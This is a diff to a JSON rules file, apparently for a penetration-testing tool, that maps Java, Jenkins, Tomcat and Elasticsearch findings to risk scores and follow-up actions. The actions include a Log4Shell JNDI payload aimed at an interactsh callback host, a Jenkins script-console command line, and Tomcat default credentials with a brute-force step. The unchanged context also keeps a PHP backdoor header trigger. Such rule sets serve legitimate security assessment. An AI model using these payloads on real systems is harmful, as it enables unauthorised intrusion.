@@ -79,6 +79,52 @@
                 "desc": "User-Agentt Backdoor",
                 "action": "Header 'User-Agentt: zerodium system(\"id\");'"
             }
+        ],
+        "java": [
+            {
+                "match": "all",
+                "name": "Log4Shell Candidate",
+                "risk": "CRITICAL",
+                "score": 100,
+                "desc": "CVE-2021-44228 (Log4j RCE)",
+                "action": "Test with interactsh: ${jndi:ldap://<host>.interact.sh/a}"
+            },
+            {
+                "match": "Spring",
+                "name": "Spring4Shell",
+                "risk": "CRITICAL",
+                "score": 98,
+                "desc": "CVE-2022-22965",
+                "action": "Check for class.module.classLoader binding."
+            }
+        ],
+        "jenkins": [
+            {
+                "match": "all",
+                "name": "Jenkins Script Console",
+                "risk": "CRITICAL",
+                "score": 100,
+                "desc": "Unauthenticated RCE via /script",
+                "action": "Execute: println \"whoami\".execute().text"
+            }
+        ],
+        "tomcat": [
+            {
+                "match": "all",
+                "name": "Tomcat Manager App",
+                "risk": "HIGH",
+                "score": 80,
+                "desc": "Default credentials (tomcat:s3cret)",
+                "action": "Bruteforce /manager/html"
+            },
+            {
+                "match": "9.0.30",
+                "name": "Ghostcat (AJP)",
+                "risk": "CRITICAL",
+                "score": 95,
+                "desc": "CVE-2020-1938",
+                "action": "Check port 8009 reading WEB-INF/web.xml"
+            }
         ]
     },
     "infra": {
@@ -166,6 +212,16 @@
                 "score": 85,
                 "desc": "postgres/postgres default",
                 "action": "psql -h <target> -U postgres"
+            }
+        ],
+        "elasticsearch": [
+            {
+                "match": "all",
+                "name": "Elasticsearch Unauth",
+                "risk": "HIGH",
+                "score": 85,
+                "desc": "No authentication on port 9200",
+                "action": "curl http://<target>:9200/_cat/indices?v"
             }
         ]
     },
